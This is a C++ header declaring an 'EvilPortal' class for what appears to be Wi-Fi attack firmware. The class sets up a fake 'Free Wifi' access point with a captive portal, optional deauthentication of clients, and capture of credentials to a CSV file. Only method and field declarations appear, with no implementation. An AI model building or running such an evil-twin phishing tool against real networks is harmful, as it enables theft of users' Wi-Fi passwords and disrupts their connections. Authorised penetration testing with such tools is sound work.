#ifndef __EVIL_PORTAL_H__
#define __EVIL_PORTAL_H__

#include <DNSServer.h>
#include <WebServer.h>
#include <globals.h>


class EvilPortal {
public:
    /////////////////////////////////////////////////////////////////////////////////////
    // Constructor
    /////////////////////////////////////////////////////////////////////////////////////
    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);
    ~EvilPortal();

    /////////////////////////////////////////////////////////////////////////////////////
    // Operations
    /////////////////////////////////////////////////////////////////////////////////////
    bool setup(void);
    void beginAP(void);
    void setupRoutes(void);
    void loop(void);

private:
    WebServer webServer;
    DNSServer dnsServer;
    IPAddress apGateway;

    uint8_t _channel;
    bool _deauth;

    String apName = "Free Wifi";
    String outputFile = "default_creds.csv";
    String htmlPage;
    String htmlFileName;
    bool isDefaultHtml = true;
    bool temp_stop = false;
    FS *fsHtmlFile;

    String lastCred;
    int totalCapturedCredentials = 0;
    int previousTotalCapturedCredentials = -1;
    String capturedCredentialsHtml = "";

    void portalController(void);
    void credsController(bool verify = false);
    bool verifyCreds(String &Ssid, String &Password);
    void restartWiFi(bool reset=true);
    void resetCapturedCredentials(void);
    void printDeauthStatus(bool);
    void printLastCapturedCredential(void);
    void debounceButtonPress(void);
    void loadCustomHtml(void);
    void loadDefaultHtml(void);
    String wifiLoadPage(void);
    String wifiLoadErrorPage(void);
    void saveToCSV(const String &csvLine, bool IsAPname = false);
    void drawScreen(bool holdDeauth);

    String getHtmlTemplate(String body);
    String creds_GET(void);
    String ssid_GET(void);
    String ssid_POST(void);
};

#endif 
